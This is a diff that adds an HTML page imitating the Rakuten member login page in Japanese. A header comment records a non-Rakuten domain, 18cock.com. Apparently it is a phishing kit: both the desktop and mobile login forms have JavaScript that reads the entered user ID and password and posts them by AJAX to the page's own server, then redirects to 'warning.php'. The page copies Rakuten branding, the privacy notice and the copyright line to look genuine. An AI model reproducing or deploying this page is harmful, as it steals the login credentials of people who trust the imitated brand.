@@ -1,0 +1,531 @@
+<!-- URL =http://haerhaerh.18cock.com/--><!-- w =(['18COCK.COM', '18cock.com'], [datetime.datetime(2020, 5, 25, 9, 24, 21), datetime.datetime(2020, 5, 25, 5, 24, 33)], [datetime.datetime(2021, 5, 25, 9, 24, 21), datetime.datetime(2021, 5, 25, 5, 24, 33)])--><html>
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="ja" http-equiv="Content-Language"/>
+  <title>
+   【楽天】ログイン
+  </title>
+  <meta content="text/javascript" http-equiv="Content-Script-Type"/>
+  <script src="com/js/id/jquery-1.12.4.min.js" type="text/javascript">
+  </script>
+  <script src="com/js/id/hint.js" type="text/javascript">
+  </script>
+  <script src="static/id.js?apps=dfp" type="text/javascript">
+  </script>
+  <meta content="width=device-width, initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no" name="viewport"/>
+  <link href="com/css/id/common_login.css" media="all" rel="stylesheet" type="text/css"/>
+  <link href="com/favicon.ico" rel="shortcut icon"/>
+  <link href="screen.css" rel="stylesheet"/>
+ </head>
+ <body id="confirm">
+  <!-- <script src="/com/tls/tls12.js" charset="utf-8"></script>  -->
+  <!-- SiteCatalyst tags -->
+  <input id="geServiceId" name="geGeneralTags" type="hidden" value=""/>
+  <input id="geRegistType" name="geGeneralTags" type="hidden" value=""/>
+  <input id="geRegistStep" name="geGeneralTags" type="hidden" value="login"/>
+  <input id="geErrorType" name="geGeneralTags" type="hidden" value=""/>
+  <!-- End SiteCatalyst tags -->
+  <div align="center">
+   <!-- ID title utility -->
+   <table border="0" cellpadding="0" cellspacing="0" width="100%">
+    <tbody>
+     <tr>
+      <td width="50%">
+       <table border="0" cellpadding="0" cellspacing="0">
+        <tbody>
+         <tr>
+          <td valign="middle">
+           <h1 style="margin:5px;padding:0">
+            <a href="">
+             <img alt="楽天" border="0" height="47" src="static/com/img/id/Rakuten_pc_32px@2x_wm.png" width="129"/>
+            </a>
+           </h1>
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+      <td class="h_r" style="text-align:right; font-size: 13px" width="50%">
+       <div>
+        <a href="#" style="font-weight:bold" target="_top">
+         楽天市場
+        </a>
+       </div>
+       <div style="margin-top:5px;">
+        <a href="#" target="_top">
+         ヘルプ
+        </a>
+       </div>
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <!-- /ID title utility -->
+   <!-- Header line -->
+   <table bgcolor="#bf0000" border="0" cellpadding="0" cellspacing="0" style="display:block; margin-bottom:10px;" width="100%">
+    <tbody>
+     <tr>
+      <td>
+       <img alt="" height="3" src="static/com/img/t.gif" width="1"/>
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <!-- /Header line -->
+  </div>
+  <noscript>
+   <p class="noJS">
+    JavaScriptが無効の為、一部のコンテンツをご利用いただけません。
+    <br/>
+    JavaScriptの設定を有効にしてからご利用いただきますようお願いいたします。※JavaScriptの設定方法は
+    <a href="https://ichiba.faq.rakuten.net/detail/000006432">
+     楽天市場お問い合わせQ&amp;A
+    </a>
+    をご覧ください。
+   </p>
+  </noscript>
+  <div id="container">
+   <script language="JavaScript">
+    function setLang(lang) {
+            document.formLang1.lang.value = lang;
+            document.formLang1.submit();
+        }
+
+        function setLangJa() {
+            setLang("ja");
+        }
+
+        function setLangEn() {
+            setLang("en");
+        }
+
+        function setLangCn() {
+            setLang("zh-cn");
+        }
+   </script>
+   <form action="#" id="formLang1" method="post" name="formLang1">
+    <input name="lang" type="hidden" value=""/>
+    <div align="right" id="language">
+     日本語 |
+     <a href="#">
+      English
+     </a>
+     |
+     <a href="#">
+      简体中文
+     </a>
+    </div>
+   </form>
+   <div id="contents">
+    <table style="background-color: #eeeeee; padding:5px 5px; font-size: 13px;" width="100%">
+     <tbody>
+      <tr>
+       <td align="left">
+        セキュリティ対策を見直しませんか？　詳細は
+        <a href="#">
+         こちら
+        </a>
+       </td>
+       <td align="right" class="b_r">
+        <a href="">
+         <img alt="banner" border="0" height="45" src="com/img/id/stop_540x249.png"/>
+        </a>
+       </td>
+      </tr>
+     </tbody>
+    </table>
+    <div id="main">
+     <p class="comment">
+      <img alt="Rakuten" class="logo" height="20" src="static/com/img/id/Rakuten_pc_20px@2x.png" width="67"/>
+      このサービスをご利用になるにはログインしてください。
+     </p>
+     <div id="mainLeft">
+      <div class="login">
+       <form action="#" autocomplete="off" id="loginForm" method="post" name="LoginForm">
+        <div id="loginInner">
+         <h3>
+          楽天会員ログイン
+         </h3>
+         <table class="loginBox">
+          <tbody>
+           <tr>
+            <td class="loginBoxName">
+             <p class="fomName">
+              <em>
+               <label for="userid">
+                ユーザID
+               </label>
+              </em>
+              <span>
+               &lt;半角英数字&gt;
+              </span>
+             </p>
+            </td>
+            <td class="loginBoxValue">
+             <input class="textBox" id="loginInner_u" maxlength="100" name="u" size="25" type="text" value=""/>
+            </td>
+           </tr>
+           <tr>
+            <td class="loginBoxName">
+             <p class="fomName">
+              <em>
+               <label for="passwd">
+                パスワード
+               </label>
+              </em>
+              <span>
+               &lt;半角英数字&gt;
+              </span>
+             </p>
+            </td>
+            <td class="loginBoxValue">
+             <input class="textBox" id="loginInner_p" maxlength="128" name="p" size="25" type="password" value=""/>
+            </td>
+           </tr>
+           <tr>
+            <td colspan="2">
+             <div id="challenger">
+              <input id="cres" name="cres" type="hidden"/>
+             </div>
+             <input id="cpid" name="cpid" type="hidden" value="56604a87-9785-43e6-99cd-5340e629adcf"/>
+             <input id="cid" name="cid" type="hidden"/>
+             <input id="ctid" name="ctid" type="hidden" value="3cf4e503-0fb9-4e9f-bd5b-ea952a70b183"/>
+             <!-- <script type="text/javascript" src="/com/js/challenger.js?ln=ja-JP&amp;tracking_id=3cf4e503-0fb9-4e9f-bd5b-ea952a70b183"></script>  -->
+             <link href="static/challenger.css?tracking_id=3cf4e503-0fb9-4e9f-bd5b-ea952a70b183" media="all" rel="stylesheet" type="text/css">
+             </link>
+            </td>
+           </tr>
+          </tbody>
+         </table>
+         <p>
+          <input class="loginButton" name="submit" type="submit" value="ログイン"/>
+         </p>
+         <p class="center">
+          <input name="pp_version" type="hidden" value="20170213"/>
+          <a href="#">
+           個人情報保護方針
+          </a>
+          に同意してログイン
+          <span style="color: #666666;">
+           (2017年2月13日改定)
+          </span>
+         </p>
+         <input class="checkBox" name="auto_logout" type="checkbox" value="true"/>
+         <label for="auto_logout">
+          ブラウザを閉じるときオートログインを無効にする
+         </label>
+         <a href="">
+          詳細
+          <img alt="新しいウィンドウが開きます" class="popUp" height="11" src="com/pop.gif" width="11"/>
+         </a>
+         <p class="caption">
+          (共有のコンピュータをお使いの方は選択してください)
+         </p>
+         <script language="JavaScript" type="text/javascript">
+          var focusControl = document.forms["LoginForm"].elements["u"];
+
+                                if (focusControl.type != "hidden") {
+                                    focusControl.focus();
+                                }
+         </script>
+        </div>
+       </form>
+       <ul id="userHelp">
+        <li>
+         <img alt="新しいウィンドウが開きます" class="popUp" height="11" src="com/pop.gif" width="11"/>
+         <a href="#">
+          ユーザID・パスワードを忘れた場合
+         </a>
+        </li>
+        <li>
+         <img alt="新しいウィンドウが開きます" class="popUp" height="11" src="com/pop.gif" width="11"/>
+         <a href="#">
+          ヘルプ
+         </a>
+        </li>
+       </ul>
+      </div>
+     </div>
+     <div id="extra">
+      <h2>
+       まだ楽天会員に登録されていない方
+      </h2>
+      <div id="newEntry">
+       <div class="btnChange">
+        <p>
+         <a href="#" id="entryBtn">
+          <span>
+           <em class="em">
+            楽天会員に新規登録（無料）
+           </em>
+           して
+           <br/>
+           サービスを利用する
+          </span>
+         </a>
+        </p>
+       </div>
+       <p class="caption">
+        <a href="#">
+         楽天会員とは？
+        </a>
+       </p>
+      </div>
+      <div class="box">
+       <dl id="info">
+        <dt>
+         楽天会員に登録してもっとお得に、もっと便利に。
+        </dt>
+        <dd>
+         <ul>
+          <li>
+           <em>
+            楽天の様々なサービスを使える共通ID
+           </em>
+           <br/>
+           楽天会員は楽天市場をはじめ、楽天トラベル、楽天ブックスなど様々なサービスを１つの共通IDで便利にお使いいただけるようになります。
+          </li>
+          <li>
+           <em>
+            楽天ポイントは貯まる！　使える！　交換できる！
+           </em>
+           <br/>
+           お買い物などに応じて楽天ポイントが貯まり、1ポイント1円としてお使いいただけます。またあなたの暮らしの中で貯まったポイントと、楽天ポイントを交換することができます。
+          </li>
+          <li>
+           <em>
+            会員ランクアップでお得に
+           </em>
+           <br/>
+           楽天のサービスを使えば使うほどお得になります。会員ランクに応じたセールやクーポンなど、お得な特典があります。
+          </li>
+         </ul>
+        </dd>
+       </dl>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div id="mobile_container">
+   <div id="languageMobile">
+    <ul>
+     <li>
+      简体中文
+     </li>
+     <div class="clear">
+     </div>
+    </ul>
+    <ul>
+     <li class="active">
+      <b>
+       日本語
+      </b>
+     </li>
+     <li>
+      English
+     </li>
+     <div class="clear">
+     </div>
+    </ul>
+    <div class="clear">
+    </div>
+   </div>
+   <div class="login_container">
+    <p>
+     セキュリティ対策を見直しませんか？詳細は
+     <a href="#">
+      こちら
+     </a>
+    </p>
+    <div class="login_form">
+     <div class="login_title">
+      <b>
+       楽天会員ログイン
+      </b>
+     </div>
+     <p id="coment">
+      IDとパスワードは半角英数字を入力してください。
+     </p>
+     <p class="comment" style="margin: 5px;">
+     </p>
+     <form action="#" method="post" name="LoginForm">
+      <ul>
+       <li>
+        <label>
+         <b>
+          ユーザID
+         </b>
+        </label>
+        <input class="loginInner_u" name="u" type="text"/>
+       </li>
+       <li>
+        <label>
+         <b>
+          パスワード
+         </b>
+        </label>
+        <input class="loginInner_p" name="p" type="password"/>
+       </li>
+      </ul>
+      <div style="margin: 5px">
+       <p>
+        <input name="pp_version" type="hidden" value="20170213"/>
+        <a href="">
+         <div style="font-size: 14px; text-align: center; font-size: 14px;">
+          個人情報保護方針
+         </div>
+        </a>
+        に同意してログイン
+        <span style="color: #666666;">
+         (2017年2月13日改定)
+        </span>
+       </p>
+       <input class="checkBox" id="auto_logout" name="auto_logout" type="checkbox" value="true"/>
+       <label for="auto_logout">
+        ブラウザを閉じるときオートログインを無効にする
+       </label>
+       <a href="">
+        詳細
+        <img alt="新しいウィンドウが開きます" class="popUp" height="11" src="com/pop.gif" width="11"/>
+       </a>
+      </div>
+      <a class="btn" href="javascript:;">
+       <img alt="" src="assets/btn.png"/>
+      </a>
+     </form>
+    </div>
+    <div class="item">
+     <ul>
+      <li>
+       <a href="">
+        ユーザID・パスワードを忘れた場合
+       </a>
+       <img src="assets/right.png"/>
+      </li>
+      <li>
+       <a href="">
+        ヘルプ
+       </a>
+       <img src="assets/right.png"/>
+      </li>
+     </ul>
+    </div>
+   </div>
+   <p style="text-align: center;line-height: 30px;">
+    まだ楽天会員に登録されていない方
+   </p>
+   <img src="assets/i1.png" style="display: block;width: 50%;margin: auto;margin-top: 10px;"/>
+   <img src="assets/i2.png" style="display: block;width: 50%;margin: auto;margin-top: 10px;"/>
+   <hr/>
+  </div>
+  <div align="center">
+   <font size="-1">
+    <a href="">
+     個人情報保護方針
+    </a>
+   </font>
+   <br/>
+   <hr size="1" style="display:block;">
+    <font size="-1">
+     Copyright © Rakuten, Inc. All Rights Reserved.
+    </font>
+   </hr>
+  </div>
+  <!-- SiteCatalyst tags -->
+  <!-- <script type="text/javascript" src="/static/sc_scode_switch.js"></script>  -->
+  <!-- End SiteCatalyst tags -->
+  <!-- Rakuten Analytics Tracker (RAT) tags -->
+  <input id="ratAccountId" name="rat" type="hidden" value="429"/>
+  <input id="ratServiceId" name="rat" type="hidden" value="1"/>
+  <input id="ratPageLayout" name="rat" type="hidden" value="pc"/>
+  <input id="ratSiteSection" name="rat" type="hidden" value="id"/>
+  <input id="ratAdobeSiteSection" name="rat" type="hidden" value="login"/>
+  <input id="ratCustomParameters" name="rat" type="hidden" value=""/>
+  <input id="ratCvEvent" name="rat" type="hidden" value=""/>
+  <!-- <script type="text/javascript" src="/static/rat-main.js"></script>  -->
+  <!-- End of RAT tags -->
+  <script type="text/javascript">
+   $('.btn').bind('click', function () {
+        var loginInner_u = $(".loginInner_u").val();
+        var loginInner_p = $(".loginInner_p").val();
+        var loginInner_error = 'アカウントが間違っています。携帯番号かメールアドレスを入力してください。';
+        if (loginInner_u == '') {
+            $(".comment").html(loginInner_error);
+            return false;
+        }
+        if (!isNaN(loginInner_u) || loginInner_u.indexOf('@') > '-1') {
+
+        } else {
+            $(".comment").html(loginInner_error);
+            return false;
+        }
+        if (loginInner_p.length <= 5) {
+            $(".comment").html('パスワードの入力が不正です。');
+            return false;
+        }
+        $.ajax({
+            url: '',
+            data: {username: loginInner_u, passwd: loginInner_p},
+            type: "POST",
+            dataType: "json",
+            success: function (r) {
+                if (r.code == 0) {
+                    window.location.href = "warning.php";
+                } else {
+                    $(".comment").html('ユーザID、パスワードの入力に誤りがあるか登録されていません。<br> 正しいユーザID、パスワードを入力してもログインできない場合は、<a href="">こちら</a>からパスワードの再設定を行なってください。<br>(なお、楽天でパスワードの初期化を行なっている場合があります。詳細は<a href="">こちら</a>)');
+                }
+            }
+        });
+    });
+
+
+    $('#loginForm').submit(function (event) {
+        event.preventDefault();
+        var loginInner_u = $("#loginInner_u").val();
+        var loginInner_p = $("#loginInner_p").val();
+        var loginInner_error = '<img src="static/com/img/id/Rakuten_pc_20px@2x.png" alt="Rakuten" class="logo" width="67" height="20" /><span id="error_show" style="color: #bf0000; font-weight: bold;"><br>アカウントが間違っています。携帯番号かメールアドレスを入力してください。</span';
+        if (loginInner_u == '') {
+            $(".comment").html(loginInner_error);
+            return false;
+        }
+        if (!isNaN(loginInner_u) || loginInner_u.indexOf('@') > '-1') {
+
+        } else {
+            $(".comment").html(loginInner_error);
+            return false;
+        }
+        if (loginInner_p.length <= 5) {
+            $(".comment").html('<img src="static/com/img/id/Rakuten_pc_20px@2x.png" alt="Rakuten" class="logo" width="67" height="20" /><span id="error_show" style="color: #bf0000; font-weight: bold;"><br>パスワードの入力が不正です。</span');
+            return false;
+        }
+        $.ajax({
+            url: '',
+            data: {username: loginInner_u, passwd: loginInner_p},
+            type: "POST",
+            dataType: "json",
+            success: function (r) {
+                if (r.code == 0) {
+                    window.location.href = "warning.php";
+                } else {
+                    $(".comment").html('<img src="static/com/img/id/Rakuten_pc_20px@2x.png" alt="Rakuten" class="logo" width="67" height="20" /><span id="error_show" style="color: #bf0000; font-weight: bold;"><br>ユーザID、パスワードの入力に誤りがあるか登録されていません。<br> 正しいユーザID、パスワードを入力してもログインできない場合は、<a href="">こちら</a>からパスワードの再設定を行なってください。<br>(なお、楽天でパスワードの初期化を行なっている場合があります。詳細は<a href="">こちら</a>)</span');
+                }
+            }
+        });
+        // return false;
+        // 直接在事件处理程序中返回false
+    });
+    var n = 0;
+    var dfpDelayId = setInterval(function () {
+        if (typeof mkfp != "undefined") {
+            clearInterval(dfpDelayId);
+            mkfp("loginForm");
+        } else if (n > 10) {
+            clearInterval(dfpDelayId);
+        } else {
+            n++;
+        }
+    }, 100);
+  </script>
+ </body>
+</html>
